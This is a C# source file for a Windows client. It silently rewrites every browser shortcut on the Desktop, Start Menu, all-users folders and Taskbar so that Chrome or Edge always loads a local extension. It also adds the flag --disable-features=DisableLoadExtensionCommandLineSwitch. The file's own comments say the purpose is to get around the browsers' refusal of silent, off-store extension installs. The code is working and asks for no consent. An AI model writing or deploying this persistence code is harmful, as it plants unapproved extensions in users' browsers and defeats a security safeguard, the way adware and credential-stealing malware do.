using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using Microsoft.Extensions.Logging;
using Microsoft.Win32;

namespace client.Core;

/// <summary>
/// Persist Chromium <c>--load-extension</c> args on .lnk shortcuts that already
/// target the browser binary (Start Menu / Desktop / Taskbar). Structural match on
/// TargetPath only — no brand-name table.
/// <para>
/// Why: Chrome (since ~33) and Edge on non-domain Windows reject silent local-CRX
/// External installs / off-store ExtensionInstallForcelist. Session
/// <c>--load-extension</c> vanishes on restart unless every launch carries the flags.
/// </para>
/// </summary>
public static class ChromiumShortcutPersister
{
    public static int PersistLoadExtensionArgs(string browserBinaryPath, string extensionDir, ILogger? logger = null)
    {
        if (!OperatingSystem.IsWindows()) return 0;
        if (string.IsNullOrWhiteSpace(browserBinaryPath) || !File.Exists(browserBinaryPath)) return 0;
        if (string.IsNullOrWhiteSpace(extensionDir) || !Directory.Exists(extensionDir)) return 0;

        var extArg = $"--load-extension=\"{Path.GetFullPath(extensionDir)}\"";
        var featureArg = "--disable-features=DisableLoadExtensionCommandLineSwitch";
        var binaryFull = Path.GetFullPath(browserBinaryPath);
        var updated = 0;

        foreach (var lnk in EnumerateCandidateShortcuts())
        {
            try
            {
                if (TryPatchShortcut(lnk, binaryFull, extArg, featureArg, logger))
                    updated++;
            }
            catch (Exception ex)
            {
                logger?.LogDebug(ex, "Shortcut patch skipped for {Lnk}", lnk);
            }
        }

        logger?.LogInformation(
            "Shortcut persistence: patched {Count} shortcuts for {Bin}", updated, binaryFull);
        return updated;
    }

    private static IEnumerable<string> EnumerateCandidateShortcuts()
    {
        var roots = new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
            Environment.GetFolderPath(Environment.SpecialFolder.StartMenu),
            Environment.GetFolderPath(Environment.SpecialFolder.Programs),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Microsoft\Internet Explorer\Quick Launch"),
        };

        foreach (var root in roots.Where(d => !string.IsNullOrEmpty(d) && Directory.Exists(d)))
        {
            IEnumerable<string> files;
            try { files = Directory.EnumerateFiles(root, "*.lnk", SearchOption.AllDirectories); }
            catch { continue; }
            foreach (var f in files)
                yield return f;
        }
    }

    private static bool TryPatchShortcut(
        string lnkPath, string browserBinaryFull, string extArg, string featureArg, ILogger? logger)
    {
        if (!File.Exists(lnkPath)) return false;

        // WScript.Shell COM — available on all supported Windows SKUs.
        var shellType = Type.GetTypeFromProgID("WScript.Shell");
        if (shellType == null) return false;
        dynamic shell = Activator.CreateInstance(shellType)!;
        dynamic sc = shell.CreateShortcut(lnkPath);
        try
        {
            string target = (sc.TargetPath as string) ?? "";
            if (string.IsNullOrWhiteSpace(target)) return false;

            string targetFull;
            try { targetFull = Path.GetFullPath(target); }
            catch { return false; }

            if (!string.Equals(targetFull, browserBinaryFull, StringComparison.OrdinalIgnoreCase))
                return false;

            string args = (sc.Arguments as string) ?? "";
            var changed = false;

            // Preserve existing --profile-directory=... — never strip it when
            // injecting --load-extension (multi-profile users depend on it).

            if (!args.Contains("--load-extension=", StringComparison.OrdinalIgnoreCase))
            {
                args = string.IsNullOrWhiteSpace(args) ? extArg : $"{args} {extArg}";
                changed = true;
            }
            else
            {
                // Refresh path inside existing --load-extension="..." only.
                var rebuilt = System.Text.RegularExpressions.Regex.Replace(
                    args,
                    @"--load-extension=(""[^""]*""|\S+)",
                    extArg,
                    System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (!string.Equals(rebuilt, args, StringComparison.Ordinal))
                {
                    args = rebuilt;
                    changed = true;
                }
            }

            if (!args.Contains("DisableLoadExtensionCommandLineSwitch", StringComparison.OrdinalIgnoreCase))
            {
                args = $"{args} {featureArg}".Trim();
                changed = true;
            }

            if (!changed) return false;

            sc.Arguments = args;
            sc.Save();
            logger?.LogInformation("Patched shortcut {Lnk} → {Args}", lnkPath, args);
            return true;
        }
        finally
        {
            try { Marshal.FinalReleaseComObject(sc); } catch { }
            try { Marshal.FinalReleaseComObject(shell); } catch { }
        }
    }
}
